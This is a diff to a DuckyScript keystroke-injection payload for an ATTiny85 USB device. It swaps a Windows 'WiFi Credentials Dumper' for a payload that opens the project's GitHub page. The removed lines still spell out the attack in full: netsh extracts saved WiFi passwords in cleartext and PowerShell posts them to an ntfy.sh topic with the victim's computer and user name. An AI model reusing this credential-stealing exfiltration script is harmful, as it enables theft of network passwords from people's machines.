@@ -1,39 +1,18 @@
-REM Title: WiFi Credentials Dumper with ntfy.sh Exfiltration
+REM ======================================
+REM Title: Open This Project's GitHub Repository
 REM Author: 3mrgnc3
-REM Description: Extracts saved WiFi credentials and exfiltrates via ntfy.sh notification
+REM Description: Opens the ATTiny85 Ducky project repository in default browser
 REM Target: Windows 10/11
+REM ======================================
 
 REM Configure USB device identity (processed before compilation)
 ATTACKMODE HID VID_16c0 PID_27db MAN_DigiKey PROD_ATTiny85_Ducky SERIAL_1337
 
-DUCKY_LANG US
+DUCKY_LANG DE
 DEFINE #HID_DELAY 1200
-DEFINE #NTFY_URL https://ntfy.sh/
 
-REM Wait for OS to recognize device
-DELAY 5000
-
-REM Open Windows Terminal
-GUI x
+DELAY 6000
+GUI r
 DELAY #HID_DELAY
-
-REM Select PowerShell (admin not required for this)
-STRINGLN i
-DELAY #HID_DELAY
-
-REM Wait for terminal to open
-DELAY 5000
-
-REM Capture WiFi credentials and exfiltrate via ntfy.sh
-STRING $p=netsh wlan show profiles|
-STRING sls 'All.*P\w*\s*:\s*(.+)$'|%{$n=$_.Matches[0].Groups[1].Value.Trim();
-STRING $p=(netsh wlan show profile name="$n" key=clear|
-STRING sls 'K\w*\s*C\w*\s*:\s*(.+)$').Matches[0].Groups[1].Value.Trim();
-STRING "${n}:$p"} 2>$null|sort -Unique|Out-String;
-STRING $r=@{Method="POST";URI="
-STRING #NTFY_URL
-STRING RAND_HEX 32
-STRING ";Headers=@{Title="$env:COMPUTERNAME\$env:USERNAME WiFi Creds Extracted"
-STRING ;Priority="urgent";Tags="warning,skull";Markdown="yes"};
-STRING Body="``````$p``````"};Invoke-RestMethod @r;Clear-Host
+STRINGLN https://github.com/3mrgnc3/attiny85_ducky?tab=readme-ov-file#attiny85-ducky
 ENTER
